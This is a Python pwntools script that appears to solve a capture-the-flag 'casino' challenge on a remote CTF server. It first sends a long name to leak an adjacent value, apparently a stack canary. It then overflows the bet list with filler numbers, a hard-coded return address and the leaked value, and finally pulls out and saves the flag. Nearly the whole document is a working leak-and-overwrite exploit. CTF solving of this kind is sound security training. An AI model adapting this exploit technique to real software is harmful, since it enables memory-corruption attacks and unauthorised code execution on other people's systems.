from pwn import * 
import re

conn = remote("isc2023.1337.cx", 10026)
# proc = process('./casino')

age = b'36'
name = 'a' * 36
name_enc = name.encode()

print(conn.recvuntil(b"age:").decode("utf-8"))
# Welcome to the Saint Tropez Virtual Casino!
# First, enter your age:
conn.sendline(age)

print(conn.recvuntil(b"name:").decode("utf-8"))
# Please enter your name:
conn.sendline(name_enc)

response = conn.recvuntil(b"stop):")
print(response)
# Welcome, aaa!
# Your balance: $250
# Please enter the list of numbers you want to roll (write 'x' to stop):
hex_val = response.split(name.encode())[1]
hex_val = hex_val.split(b'\xfa')[0]
print('hex_val =', hex_val)
param_1 = int.from_bytes(hex_val, byteorder="little")
print("param_1 = ", param_1)

bets_str = '1 ' * 57
bets_enc = bets_str.encode() + b"134517334 25 " + str(param_1).encode() + b" x"

conn.sendline(bets_enc)

print(conn.recvuntil(b"n]").decode("utf-8"))
# You got: 37 out of 62
# Remaining balance: $192
# Continue? [Y/n]
conn.sendline(b'y')

response = conn.recvuntil(b"}").decode("utf-8")
print(response)

pattern = r'SpeishFlag\{.*?\}'
matches = re.findall(pattern, response)
print(matches[0])

with open('../sol/flag3', 'w') as f:
    f.write(matches[0])